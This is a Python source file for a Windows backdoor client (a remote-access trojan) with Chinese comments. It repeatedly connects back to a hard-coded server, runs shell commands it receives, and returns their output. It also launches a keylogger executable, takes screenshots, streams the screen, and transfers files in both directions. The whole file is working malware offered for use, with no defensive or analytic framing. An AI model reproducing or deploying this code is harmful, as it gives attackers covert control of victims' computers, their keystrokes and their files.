import socket,os,psutil,subprocess,threading
from multiprocessing import Process
from time import sleep
import win32gui
import win32ui
import win32con
import win32api
 


def screenshots():
    hdesktop = win32gui.GetDesktopWindow()
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, 'screenshot.bmp')
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def get_process_pid(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            return proc.info['pid']
    return None
server_ip='192.168.10.60'
port=6369
def share_screen():
    from PIL import ImageGrab
    from io import BytesIO
    width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
    # 压缩时，大小变为一半
    w = width // 2
    h = height // 2
    while True:
        img = ImageGrab.grab(bbox=(0, 0, width, height))
        img.thumbnail((w, h))
        output_buffer = BytesIO() 
        img.save(output_buffer, format='JPEG', quality=50)
        frame = output_buffer.getvalue()  # 获取二进制数据
        s.sendto(frame, (server_ip, port))
        sleep(0.05)  # 加点延时更稳定。

def key_lis():
    print("im run ")
    subprocess.run(r"C:\Users\Administrator\Desktop\door\key_listen.exe")
def start_client(s):
    s.send(bytes("sect success", encoding="gbk"))
    while True:
        data2="无效命令\n"
        try:
            data = s.recv(1024)
            print(data)
            data = str(data, encoding="gbk")
            if len(data)<=0 or data=="\n" or data=="\r" or data=="":
                print("empty data")
                data2="你发送了空数据"
                s.close()
                break
            if (data[0]=="ojbk"):
                data2="command success"
            elif (data[0]=="$"):
                data=data.replace("$","")
                f = os.popen(data)
                data2 = f.read()
                s.send(bytes(data2, encoding="gbk"))
            elif(data[0]=="@"):
                extend_func=data.replace("@","")
                extend_func=extend_func.split(" ",1)
                print(extend_func)
                if extend_func[0]=="keylisten":
                    threading.Thread(target=key_lis).start()
                    s.send(bytes("ojbk", encoding="gbk"))
                if extend_func[0]=="del_keylisten": #会创建两个进程
                    os.kill(get_process_pid("key_listen.exe"),9)
                    os.kill(get_process_pid("key_listen.exe"),9)
                    s.send(bytes("ojbk", encoding="gbk"))
                if extend_func[0]=="upload":
                    s.send(bytes("ok", encoding="gbk"))
                    recv_file=data.replace("upload ","")
                    print("will recv file<----"+recv_file)
                    recvd_size = 0 
                    file_name=os.path.basename(recv_file)
                    fp = open(r"./"+file_name, 'wb')#ab追加 wb覆盖
                    file_size=int(s.recv(1024))
                    print("recv size:",file_size)
                    while not recvd_size == file_size:
                        if file_size - recvd_size > 1024:
                            data = s.recv(1024)
                            recvd_size += len(data)
                        else:
                            data = s.recv(file_size - recvd_size)
                            recvd_size = file_size
                            fp.write(data)
                    fp.close()
                    s.send(bytes("success", encoding="gbk"))
                    s.send(bytes("command success", encoding="gbk"))
                if extend_func[0]=="recv":
                        send_file=data.replace("@recv ","")
                        print("you try upload file--->"+send_file)
                        if os.path.isfile(send_file):
                            redat=s.recv(1024)
                            print(redat)
                            if redat==b'ok':
                                print("start send")
                                file_quality=str(os.stat(send_file).st_size).encode("gbk")
                                print("file size:",file_quality)
                                s.send(file_quality)
                                fp = open(send_file, 'rb')
                                while 1:
                                    data = fp.read(1024)
                                    if not data and s.recv(1024)==b'success':
                                        print("send succes")
                                        fp.close()
                                        break
                                    s.send(data)
                            else:
                                print("target return other message")
                        else:s.send("no file")
                if extend_func[0]=="screenshots":
                    screenshots()
                    s.send(bytes("ojbk", encoding="gbk"))
                if extend_func[0]=="see":#未验证
                    share_screen()
            else:
                s.send(bytes(data2, encoding="gbk"))


#        except sectionResetError:
#            print("远程主机强迫关闭了一个现有的连接。")
 #           sleep(1)
 #           s.close()
 #           break
        except OSError:
            print("OSError: [WinError 10038] 在一个非套接字上尝试了一个操作。")
            sleep(1)
            s.close()
            break
        sleep(1)
    print(999)
while 1:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("ret connect...")
        s.connect((server_ip, port))
        print ("[+] new sect" , server_ip + ":", port)
        start_client(s)
        #start_new_thread(clientthread, (s,))
        s.close()
    except:
        sleep(0.5)
